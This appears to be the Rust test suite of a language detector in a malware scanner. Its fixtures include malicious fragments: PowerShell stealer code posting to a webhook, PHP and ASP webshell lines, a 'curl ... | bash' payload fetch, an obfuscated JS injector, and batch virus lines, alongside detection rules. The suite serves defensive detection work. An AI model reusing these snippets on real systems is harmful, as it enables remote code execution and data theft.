    #[test]
    fn fat_boot_sector_rejects_each_required_bpb_field_when_invalid() {
        let sector = fat12_boot_sector();
        let mut mutations: Vec<(&str, Box<dyn Fn(&mut [u8; 512])>)> = vec![
            (
                "bytes per sector",
                Box::new(|b| b[11..13].copy_from_slice(&513u16.to_le_bytes())),
            ),
            ("cluster size", Box::new(|b| b[13] = 3)),
            ("reserved sectors", Box::new(|b| b[14..16].fill(0))),
            ("fat count", Box::new(|b| b[16] = 0)),
            ("media descriptor", Box::new(|b| b[21] = 0)),
            (
                "fat size",
                Box::new(|b| {
                    b[22..24].fill(0);
                    b[36..40].fill(0);
                }),
            ),
            (
                "volume size",
                Box::new(|b| {
                    b[19..21].fill(0);
                    b[32..36].fill(0);
                }),
            ),
            ("sectors per track", Box::new(|b| b[24..26].fill(0))),
            ("head count", Box::new(|b| b[26..28].fill(0))),
            ("jump opcode", Box::new(|b| b[0] = 0x90)),
            ("short jump NOP", Box::new(|b| b[2] = 0x91)),
            ("boot signature", Box::new(|b| b[511] = 0)),
        ];
        for (name, mutate) in mutations.drain(..) {
            let mut invalid = sector;
            mutate(&mut invalid);
            assert!(
                !looks_like_fat_boot_sector(&invalid),
                "accepted invalid {name}"
            );
        }

        let mut signature_only = [0x41u8; 512];
        signature_only[510..].copy_from_slice(&[0x55, 0xAA]);
        assert!(!looks_like_fat_boot_sector(&signature_only));
        assert!(!looks_like_fat_boot_sector(&sector[..511]));
    }

    #[test]
    fn prose_with_keywords_is_not_source() {
        // Sentences that happen to contain JavaScript's scored tokens.
        let para = "Let us go, said Tom, for the new day was const and true. \
                    We shall let it be. And var the river ran, this. is what \
                    the window. of the cabin showed us, and const it stayed.\n";
        let data = para.repeat(40);
        assert!(data.len() >= PROSE_GUARD_MIN_BYTES);
        assert!(looks_like_prose(data.as_bytes()));
        assert_eq!(detect_from_content(data.as_bytes()), None);
    }

    #[test]
    fn source_with_prose_comments_still_detects() {
        let js = "// A long explanatory comment that reads like prose and goes on.\n\
                  const x = require('fs');\nmodule.exports = function (a, b) {\n\
                  \treturn a === b;\n};\nconsole.log(x);\n";
        let data = js.repeat(20);
        assert!(!looks_like_prose(data.as_bytes()));
        assert_eq!(
            detect_from_content(data.as_bytes()),
            Some(FileType::JavaScript)
        );
    }

    /// Both automata are built from static patterns, and a failure to build
    /// either must not pass as "no language here".
    #[test]
    fn pattern_automata_build() {
        assert_eq!(SCANNER.ac.patterns_len(), PATTERNS.len());
        assert_eq!(SCANNER.entries.len(), PATTERNS.len());
        assert!(HTML_AC.is_match(b"<HTML>"));
    }

    /// A score index, its place in `LANGS` and its file type agree.
    #[test]
    fn languages_round_trip_through_file_types() {
        for (i, &lang) in LANGS.iter().enumerate() {
            assert_eq!(lang.idx(), i, "{lang:?}");
            assert_eq!(Lang::from_file_type(lang.to_file_type()), Some(lang));
        }
        assert_eq!(Lang::from_file_type(FileType::Go), None);
    }

    /// Two languages both past 655 points used to overflow `u16` when their
    /// ratio was taken, which panics in a debug build. They are simply too
    /// close to call.
    #[test]
    fn saturated_scores_are_compared_without_overflow() {
        let data = b"self.;cd /;".repeat(SCAN_LIMIT / 11);
        let scores = scan_scores(&data);
        assert!(scores[Lang::Python.idx()] > 655 && scores[Lang::Shell.idx()] > 655);
        assert_eq!(detect_from_content(&data), None);
    }

    #[test]
    fn binary_judgement_reads_past_a_utf8_bom() {
        let mut data = b"\xEF\xBB\xBF".to_vec();
        data.extend_from_slice(b"\x01\x02\x03\x04\x05\x06\x07\x08 mostly text\n");
        assert!(binary_not_source(&data));
        assert!(!binary_not_source(
            b"\xEF\xBB\xBF#import <Foundation/Foundation.h>\n"
        ));
    }

    #[test]
    fn prose_guard_skips_tiny_inputs() {
        let tiny = b"var x = require('foo');\nmodule.exports = x;\n";
        assert!(tiny.len() < PROSE_GUARD_MIN_BYTES);
        assert_eq!(detect_from_content(tiny), Some(FileType::JavaScript));
    }

    #[test]
    fn shell_heuristic() {
        let data = b"export PATH=/usr/bin\nif [ -f /etc/foo ]; then\n  echo ok\nfi\n";
        assert_eq!(detect_from_content(data), Some(FileType::Shell));
    }

    /// Line-anchored tokens must score under CRLF endings too.
    #[test]
    fn crlf_line_tokens() {
        let sh = b"if [ -f /etc/foo ]; then\r\n  echo ok\r\nfi\r\n";
        assert_eq!(detect_from_content(sh), Some(FileType::Shell));
        let pl = b"use strict\r\n;\r\nprint 1;\r\n";
        assert_eq!(detect_from_content(pl), Some(FileType::Perl));
    }

    #[test]
    fn python_heuristic() {
        let data = b"import os\nimport sys\ndef main():\n    print('hello')\n";
        assert_eq!(detect_from_content(data), Some(FileType::Python));
    }

    #[test]
    fn python_name_main() {
        let data = b"if __name__ == '__main__':\n    main()\n";
        assert_eq!(detect_from_content(data), Some(FileType::Python));
    }

    #[test]
    fn powershell_heuristic() {
        let data =
            b"$ErrorActionPreference = 'Stop'\nWrite-Host 'hello'\nGet-Process | Set-Variable\n";
        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
    }

    // A Discord clipboard stealer from the gauntlet, cut to its opening. It
    // carries no `$ErrorActionPreference`/`Write-Host`, only the advanced
    // function and `Add-Type` idioms.
    #[test]
    fn powershell_advanced_function_and_add_type() {
        let data = b"Add-Type -AssemblyName WindowsBase\r\n\
            Add-Type -AssemblyName PresentationCore\r\n\r\n\
            function dischat {\r\n  [CmdletBinding()]\r\n  param (\r\n\
            [Parameter (Position=0,Mandatory = $True)]\r\n  [string]$con\r\n  )\r\n\
            $Body = @{ 'username' = $env:username; 'content' = $con }\r\n\
            Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body\r\n}\r\n";
        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
    }

    #[test]
    fn powershell_cmdletbinding_alone() {
        let data = b"function Get-Thing {\n    [CmdletBinding()]\n    param([string]$Name)\n    $Name\n}\n";
        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
    }

    #[test]
    fn powershell_add_type_alone() {
        let data = b"Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Clipboard]::GetText()\n";
        assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
    }

    // `$env:` is only strong evidence: one mention in a line of text is not a
    // PowerShell script.
    #[test]
    fn powershell_env_drive_alone_is_not_enough() {
        let data = b"Set the value through $env:PATH before you start the tool.\n";
        assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
    }

    // A batch file that shells out to PowerShell mentions `$env:` inside the
    // `-Command` string; the line grammar still decides it is batch.
    #[test]
    fn batch_quoting_powershell_env_stays_batch() {
        let data = b"@echo off\r\nsetlocal\r\npowershell -NoProfile -Command \"Write-Output $env:TEMP\"\r\nset X=%TEMP%\r\n";
        assert_eq!(detect_from_content(data), Some(FileType::Batch));
    }

    // A C# cmdlet declares `[Cmdlet(...)]`, never `[CmdletBinding(`.
    #[test]
    fn csharp_cmdlet_is_not_powershell() {
        let data = b"using System.Management.Automation;\n\
            [Cmdlet(VerbsCommon.Get, \"Thing\")]\n\
            public class GetThing : PSCmdlet {\n    protected override void ProcessRecord() { }\n}\n";
        assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
    }

    #[test]
    fn perl_use_strict() {
        let data = b"use strict;\nuse warnings;\nmy $x = 1;\n";
        assert_eq!(detect_from_content(data), Some(FileType::Perl));
    }

    #[test]
    fn batch_echo() {
        let data = b"@echo off\nSETLOCAL\nset PATH=%PATH%;C:\\bin\n";
        assert_eq!(detect_from_content(data), Some(FileType::Batch));
    }

    #[test]
    fn vbs_wscript() {
        let data =
            b"Dim x\nSet obj = CreateObject(\"Scripting.FileSystemObject\")\nWScript.Echo x\n";
        assert_eq!(detect_from_content(data), Some(FileType::Vbs));
    }

    #[test]
    fn lua_setmetatable() {
        let data = b"local t = {}\nsetmetatable(t, {__index = function() end})\n";
        assert_eq!(detect_from_content(data), Some(FileType::Lua));
    }

    #[test]
    fn minified_obfuscated_lua() {
        // Prometheus-style output: one line, no environment calls in the head.
        let data = br#"return(function(...)local J=function(E)local H,v=E[#E],""for J=1,#H,1 do v=v..H[E[J]]end return v end local E={J({1;3,2,{"\110","\108"}})}end)(...)"#;
        assert_eq!(detect_from_content(data), Some(FileType::Lua));
        let data = b"local function f(a) return a end\nlocal function g(b) return f(b) end\n";
        assert_eq!(detect_from_content(data), Some(FileType::Lua));
    }

    #[test]
    fn javascript_rest_parameters_are_not_lua() {
        let data = b"const f = function(...args) { return args.length; };\nmodule.exports = f;\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn php_html_fragment_not_lua() {
        let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
        assert_eq!(detect_from_content(data), Some(FileType::Php));
    }

    #[test]
    fn detection_rules_quoting_php_superglobals_are_not_php() {
        // A YAML rule file whose regexes match PHP stagers: it names `$_POST`
        // and `$_COOKIE` but contains no PHP tag, so it is not PHP.
        let data = br#"defaults:
  platforms: [linux, unix]
  for: [data]

traits:
  - id: webshell-post-loop
    desc: foreach over POST parameters
    if:
      type: raw
      regex: foreach\s*\(\s*\$_POST\s+as.{0,80}==\s*16

  - id: webshell-cookie-post-pair
    if:
      type: raw
      regex: \$_COOKIE\s*,\s*\$_POST
"#;
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn php_requires_a_tag() {
        // Same superglobals, no tag — prose about PHP is not PHP.
        let untagged = b"The handler reads $_POST and $_GET, then calls preg_replace( ) on it.\n";
        assert_eq!(detect_from_content(untagged), None);

        // The opening tag settles it.
        let tagged = b"<?php\n$x = $_POST['a'];\necho $x;\n";
        assert_eq!(detect_from_content(tagged), Some(FileType::Php));
    }

    #[test]
    fn php4_var_properties_are_php_not_javascript() {
        // `var $name` is a PHP 4 property. Scoring it as JavaScript `var `
        // tied the two languages and left the file unidentified.
        let data = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    system($this->shell);\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
        assert_eq!(detect_from_content(data), Some(FileType::Php));
    }

    #[test]
    fn short_tag_stripslashes_webshell_is_php() {
        let data = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
        assert_eq!(detect_from_content(data), Some(FileType::Php));
    }

    #[test]
    fn itself_and_except_prose_is_not_python() {
        let data = b"Modified Version, except to acknowledge the contribution.\n\
Original or Modified Versions may be sold by itself.\n";
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn let_the_and_applet_prose_is_not_javascript() {
        let data = b"If you discover a problem, post a message and let the rest of us know.\n\
Coordinate with the Applet Maintainer before sweeping changes.\n";
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn python_self_attribute_and_except_still_detected() {
        let data = b"try:\n    self.foo()\nexcept Exception:\n    pass\n";
        assert_eq!(detect_from_content(data), Some(FileType::Python));
    }

    #[test]
    fn javascript_let_binding_still_detected() {
        let data =
            b"function main() {\n  let count = 1;\n  let total = count;\n  return total;\n}\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn eval_call_is_not_kotlin_val() {
        let data = b"<%\nre = request(\"sb\")\neval(request(0))\nexecute re\n%>\n";
        assert_ne!(detect_from_content(data), Some(FileType::Kotlin));
    }

    #[test]
    fn kotlin_val_bindings_still_detected() {
        let data = b"fun main() {\n  val count = 1\n  val total = count\n}\n";
        assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
    }

    #[test]
    fn php_just_past_the_first_window_is_still_php() {
        let mut data = Vec::new();
        for _ in 0..600 {
            data.extend_from_slice(b"/* x */\n");
        }
        data.extend_from_slice(b"<?php\n$x = $_POST['a'];\neval($x);\n");
        assert!(data.len() > SCAN_LIMIT);
        assert_eq!(detect_from_content(&data), Some(FileType::Php));
    }

    #[test]
    fn xml_processing_instruction_is_not_a_php_tag() {
        let data = br#"<?xml version="1.0"?>
<rules>
  <rule match="$_POST"/>
  <rule match="$_GET"/>
  <rule match="$_SERVER"/>
</rules>
"#;
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn yaml_detection_rules_are_not_typed_as_what_they_match() {
        // Detection content names the tokens it hunts for. Each of these rule
        // files quotes a different language's conclusive markers; none of them
        // is that language. The `.yaml` extension normally suppresses content
        // heuristics, but a renamed, disabled, or extensionless copy reaches
        // them, so the document shape has to carry the decision.
        let python = br#"traits:
  - id: py-stager-entrypoint
    desc: Python stager entrypoint
    if:
      type: raw
      substr: if __name__
  - id: py-stager-imports
    if:
      type: raw
      substr: import os
  - id: py-stager-decode
    if:
      type: raw
      substr: base64.b64decode
"#;
        assert_eq!(detect_from_content(python), None);

        let applescript = br#"traits:
  - id: amos-shell-handoff
    desc: AMOS stealer shell handoff
    if:
      type: raw
      substr: do shell script
  - id: amos-tell-finder
    if:
      type: raw
      substr: tell application "Finder"
  - id: amos-quoted-form
    if:
      type: raw
      substr: quoted form of
"#;
        assert_eq!(detect_from_content(applescript), None);

        let powershell = br#"traits:
  - id: ps-loader-preference
    if:
      type: raw
      substr: $ErrorActionPreference
  - id: ps-loader-convert
    if:
      type: raw
      substr: "[System.Convert]"
  - id: ps-loader-xor
    if:
      type: raw
      substr: " -bxor "
"#;
        assert_eq!(detect_from_content(powershell), None);

        let vbs = br#"traits:
  - id: vbs-dropper-host
    if:
      type: raw
      substr: WScript.Shell
  - id: vbs-dropper-explicit
    if:
      type: raw
      substr: Option Explicit
  - id: vbs-dropper-createobject
    if:
      type: raw
      substr: CreateObject(
"#;
        assert_eq!(detect_from_content(vbs), None);
    }

    #[test]
    fn json_manifest_quoting_language_tokens_is_not_that_language() {
        let data = br##"{
  "name": "rule-pack",
  "rules": [
    {"id": "py", "match": "import os"},
    {"id": "ps", "match": "$ErrorActionPreference"},
    {"id": "lua", "match": "setmetatable"},
    {"id": "c", "match": "#include <stdio.h>"}
  ]
}
"##;
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn sql_query_is_not_a_dockerfile() {
        // `\nFROM ` is the Dockerfile marker, but uppercase SQL puts FROM at the
        // start of a line too. A Dockerfile must begin with FROM (or ARG); this
        // begins with SELECT.
        let data = br#"SELECT id, name, created_at
FROM users
WHERE created_at > now() - interval '7 days'
ORDER BY created_at DESC;
"#;
        assert_ne!(detect_from_content(data), Some(FileType::Dockerfile));

        // A real Dockerfile still resolves.
        let dockerfile = br#"# syntax=docker/dockerfile:1
FROM alpine:3.20
RUN apk add --no-cache curl
COPY entrypoint.sh /entrypoint.sh
"#;
        assert_eq!(detect_from_content(dockerfile), Some(FileType::Dockerfile));
    }

    #[test]
    fn javascript_module_exports() {
        let data = b"var x = require('foo');\nmodule.exports = x;\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn javascript_iife_console() {
        let data = b"(function() { var x = 1; console.log(x); })();\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn license_prose_not_javascript() {
        // GPL/LGPL prose hits JS keyword tokens — "this document." (document.),
        // and "tablet"/"outlet"/"let you" (let ) — but has no JS structure
        // (`;`/`{`/`}`). It must not classify as JavaScript on keywords alone.
        let data = b"You may copy and distribute verbatim copies of this document. \
A tablet or outlet may let you study the freedom this license grants. \
Everyone is permitted to copy this document. then let recipients know their rights.";
        assert_ne!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn javascript_dom_with_structure_still_detected() {
        // Real DOM JS: document.<member>/window.<member> plus a statement
        // terminator — structure present, so it detects.
        let data = b"const el = document.getElementById('x');\nwindow.location = el;\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }

    #[test]
    fn applescript_stealer_handlers() {
        // AMOS/Shub-family plaintext AppleScript stealer delivered with a
        // `.unknown` extension: handler blocks plus `do shell script` and
        // `quoted form of POSIX path` must classify as AppleScript, not unknown.
        let data = b"on filesizer(paths)\n\
\tset fsz to 0\n\
\ttry\n\
\t\tset theItem to quoted form of POSIX path of paths\n\
\t\tset fsz to (do shell script \"/usr/bin/mdls -name kMDItemFSSize -raw \" & theItem)\n\
\tend try\n\
\treturn fsz\n\
end filesizer\n";
        assert_eq!(detect_from_content(data), Some(FileType::AppleScript));
    }

    #[test]
    fn applescript_tell_block() {
        let data = b"tell application \"Finder\"\n\
\tset x to name of every file\n\
end tell\n";
        assert_eq!(detect_from_content(data), Some(FileType::AppleScript));
    }

    #[test]
    fn pacman_install_scriptlet() {
        // AUR `.install` scriptlet (the AUR/ALVR supply-chain delivery vector):
        // the pacman hook-function definitions must classify as Shell even with
        // an unmapped `.install` extension so install-hook composites can fire.
        let data = b"post_install() {\n  cd /tmp\n  npm install atomic-lockfile yargs\n}\n";
        assert_eq!(detect_from_content(data), Some(FileType::Shell));
    }

    #[test]
    fn nohup_curl_pipe_bash_is_shell() {
        // Disk-image lures named `Drag into Terminal.xyz` are a one-line
        // shell with no shebang and a non-shell extension.
        let data = b"nohup curl -s https://example.pages.dev/payload.aspx | bash\n";
        assert_eq!(detect_from_content(data), Some(FileType::Shell));
    }

    #[test]
    fn debian_dh_install_is_not_shell() {
        // Debian `debian/*.install` files share the extension but are plain
        // path lists with no scriptlet functions — they must NOT become Shell.
        let data = b"usr/bin/foo\nusr/share/foo/bar.png\netc/foo/foo.conf\n";
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn c_include() {
        let data = b"#include <stdio.h>\nint main() { return 0; }\n";
        assert_eq!(detect_from_content(data), Some(FileType::C));
    }

    #[test]
    fn html_detection() {
        assert!(looks_like_html(
            b"<!DOCTYPE html><html><body>hi</body></html>"
        ));
        assert!(looks_like_html(
            b"<html><head><title>x</title></head></html>"
        ));
        assert!(!looks_like_html(b"just some plain text here"));
    }

    #[test]
    fn empty_data() {
        assert_eq!(detect_from_content(b""), None);
    }

    #[test]
    fn random_binary() {
        let data: Vec<u8> = (0..=255).collect();
        assert_eq!(detect_from_content(&data), None);
    }

    #[test]
    fn whitespace_padded_python() {
        let mut data = vec![b' '; 5000];
        data.extend_from_slice(b"import os\nimport sys\ndef main():\n    print('hello')\n");
        assert_eq!(detect_from_content(&data), Some(FileType::Python));
    }

    #[test]
    fn whitespace_padded_javascript() {
        let mut data = vec![b'\n'; 5000];
        data.extend_from_slice(
            b"(function() { var x = 1; console.log(x); module.exports = x; })();\n",
        );
        assert_eq!(detect_from_content(&data), Some(FileType::JavaScript));
    }

    #[test]
    fn kotlin_heuristic() {
        let data = b"
package com.airbnb.lottie.baselineprofile

import androidx.benchmark.macro.junit4.BaselineProfileRule
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.filters.LargeTest
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith

/**
 * You can run the generator with the Generate Baseline Profile gradle task.
 * ```
 * ./gradlew :lottie(-compose):generateReleaseBaselineProfile -Pandroid.testInstrumentationRunnerArguments.androidx.benchmark.enabledRules=BaselineProfile
 * ```
 *
 * After you run the generator, you can verify the improvements running the [StartupBenchmarks] benchmark.
 **/
@RunWith(AndroidJUnit4::class)
@LargeTest
class BaselineProfileGenerator {

    @get:Rule
    val rule = BaselineProfileRule()

    @Test
    fun generate() {
        rule.collect(\"com.airbnb.lottie.benchmark.app\") {
            pressHome()
            startActivityAndWait()
        }
    }
}
";
        assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
    }

    #[test]
    fn prose_with_package_word_is_not_kotlin() {
        // Texinfo/prose that line-wraps to "package for creating scripts"
        // (GNU Autoconf manual) must not be mistaken for Kotlin via a bare
        // `package ` substring. With no second Kotlin token it stays below
        // threshold.
        let data = b"This is ./autoconf.info, produced by makeinfo version 4.8 from\n\
./autoconf.texi.  This manual is for GNU Autoconf, a\n\
package for creating scripts to configure source code packages.\n";
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn apt_translation_catalogue_is_not_kotlin() {
        // /var/lib/apt/lists/*_i18n_Translation-en: deb822 stanzas whose folded
        // continuations are English package descriptions. Six occurrences of
        // "package " in the first 4 KB scored Kotlin 30 against a threshold of
        // 10, so 32 MB of prose was parsed as Kotlin and the JVM credential
        // rules fired on it (`id_rsa`, /etc/shadow and crontab lines all appear
        // in the descriptions of openssh-client, passwd and cron).
        let data = b"Package: 0ad-data\n\
Description-md5: 26581e685027d5ae84824362a4ba59ee\n\
Description-en: Real-time strategy game of ancient warfare (data files)\n\
\x20 0 A.D. is a free, open-source, cross-platform real-time strategy game.\n\
\x20.\n\
\x20This package contains the main data files required by 0 A.D.\n\
\n\
Package: openssh-client\n\
Description-md5: 9d1b1b0e8e2b0e4e0e6a9e4f9c6b5a3d\n\
Description-en: secure shell (SSH) client\n\
\x20This package provides the ssh client and reads ~/.ssh/id_rsa.\n";
        assert_eq!(detect_from_content(data), None);
    }

    #[test]
    fn kotlin_package_declaration_is_not_a_deb822_field() {
        // The stanza check must not swallow real Kotlin: `package a.b` has no
        // colon, so the file's first significant line is not a field line.
        let data = b"package com.example.app\n\
\n\
import kotlin.io.println\n\
\n\
suspend fun main() {\n\
    val greeting = \"hi\"\n\
    println(greeting)\n\
}\n";
        assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
    }

    #[test]
    fn var_heavy_obfuscated_js_is_not_kotlin() {
        // Trojanized WordPress JS (VirusShare sample): a jQuery script with an
        // appended obfuscated injector whose renamed locals use `var` ~14×.
        // `var ` is a JS keyword, not a Kotlin signal — the JS markers
        // (`(function(`, `===`, `window.`) must win, not lose to Kotlin's `var`.
        let data = b"jQuery(function( $ ){ $('.x').click(function(){}); });\n\
if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){\
var P=y[O];return P;};}var ndsw=true,HttpClient=function(){var S=g;};\
var rand=function(){var C=g;};(function(){var Y=g,R=navigator;\
var D=new HttpClient();window['eval'](R);}());}\n";
        assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
    }
}

#[cfg(test)]
mod binary_guard_tests {
    use super::*;

    #[test]
    fn dos_com_is_not_clojure() {
        // A kilobyte of x86 with two chance `#'` pairs -- the shape that had
        // vxheaven's Virus.DOS.FastKiller.481 typed as Clojure.
        let mut data = vec![0xBEu8, 0x10, 0x01, 0x8B, 0xFE, 0xB9, 0xD0, 0x01];
        for i in 0..500u32 {
            // Roughly the mix the real sample has: opcodes, operands and a
            // steady dusting of control bytes.
            data.push((i % 0x1F) as u8);
            data.push(b'A' + (i % 26) as u8);
        }
        data.extend_from_slice(b"#'");
        data.extend_from_slice(b"#'");
        assert_eq!(detect_from_content(&data), None);
    }

    #[test]
    fn real_clojure_still_detected() {
        let src = b"(ns app.core\n  (:require [clojure.string :as str]))\n\n(defn greet [n]\n  (str \"hi \" n))\n";
        assert_eq!(detect_from_content(src), Some(FileType::Clojure));
    }

    #[test]
    fn python_comments_with_clojure_var_quote_tokens_stay_python() {
        // A sample uploader comments out lists of tags as `#'exe`, `#'elf`,
        // etc. Treating that Python comment prefix as Clojure's var-quote
        // reader macro outweighed strong Python imports and function syntax.
        let src = b"import os\nimport json\nimport requests\n\ndef submit_samples(auth_key, folder_path):\n    tags = [\n        #'exe', #'elf', #'trojan', #'dropper',\n    ]\n    try:\n        response = requests.post(url, files=tags)\n    except Exception as e:\n        print(e)\n";
        assert_eq!(detect_from_content(src), Some(FileType::Python));
    }

    #[test]
    fn batch_still_detected() {
        let src = b"@echo off\r\nsetlocal\r\nset PATH=%PATH%;C:\\bin\r\necho done\r\n";
        assert_eq!(detect_from_content(src), Some(FileType::Batch));
    }

    #[test]
    fn utf8_source_with_accents_is_not_binary() {
        let src = "(ns café.core)\n(defn saluer [n] (str \"bonjour \" n))\n(defn adieu [n] (str \"au revoir \" n))\n".as_bytes();
        assert_eq!(detect_from_content(src), Some(FileType::Clojure));
    }
}

#[cfg(test)]
mod lowercase_batch_heuristic_tests {
    use super::*;

    /// Batch is case-insensitive and is usually written in lower case. A
    /// script that does not open with `@echo off` used to score zero.
    #[test]
    fn lowercase_batch_body_is_recognised() {
        let data = b"@ctty nul\nfor %%f in (*.com) do set K=%%f\nattrib +h Y%K%\ngoto end\n:end\n";
        assert_eq!(detect_from_content(data), Some(FileType::Batch));
    }

    /// `errorlevel` is spelled that way in no other language.
    #[test]
    fn errorlevel_marks_a_batch_script() {
        let data = b"find \"CW\" <%1 >nul\nif not errorlevel 1 goto c\nren %1 vir.tmp\n";
        assert_eq!(detect_from_content(data), Some(FileType::Batch));
    }

    /// C's `goto` is deliberately not a batch token, so C source is untouched.
    #[test]
    fn c_goto_is_not_batch() {
        let data = b"int f(int x){ if(!x) goto done; return 1; done: return 0; }\n";
        assert_ne!(detect_from_content(data), Some(FileType::Batch));
    }
}

#[cfg(test)]
mod decoded_text_tests {
    use super::*;

    fn utf16(text: &str, little_endian: bool) -> Vec<u8> {
        text.encode_utf16()
            .flat_map(|u| {
                if little_endian {
                    u.to_le_bytes()
                } else {
                    u.to_be_bytes()
                }
            })
            .collect()
    }

    #[test]
    fn utf16_is_narrowed() {
        let text = "Set x = CreateObject(\"WScript.Shell\") ' caf\u{e9}\r\n".repeat(4);
        let mut le = vec![0xFF, 0xFE];
        le.extend(utf16(&text, true));
        assert_eq!(decoded_text(&le).unwrap().as_ref(), text.as_bytes());
        let mut be = vec![0xFE, 0xFF];
        be.extend(utf16(&text, false));
        assert_eq!(decoded_text(&be).unwrap().as_ref(), text.as_bytes());
        // No mark: the lane of NULs says which order.
        assert_eq!(
            decoded_text(&utf16(&text, true)).unwrap().as_ref(),
            text.as_bytes()
        );
        assert_eq!(
            decoded_text(&utf16(&text, false)).unwrap().as_ref(),
            text.as_bytes()
        );
        // Short text with a mark still decodes.
        let mut short = vec![0xFF, 0xFE];
        short.extend(utf16("MsgBox 1", true));
        assert_eq!(decoded_text(&short).unwrap().as_ref(), b"MsgBox 1");
    }

    #[test]
    fn mark_on_eight_bit_text_is_dropped() {
        let data = b"\xff\xfe&cls\r\nstart \"\" x.exe\r\n\x00";
        assert_eq!(decoded_text(data).unwrap().as_ref(), &data[2..]);
    }

    #[test]
    fn ordinary_bytes_are_left_alone() {
        assert!(decoded_text(b"@echo off\r\n").is_none());
        assert!(decoded_text(&[0u8; 256]).is_none());
    }
}
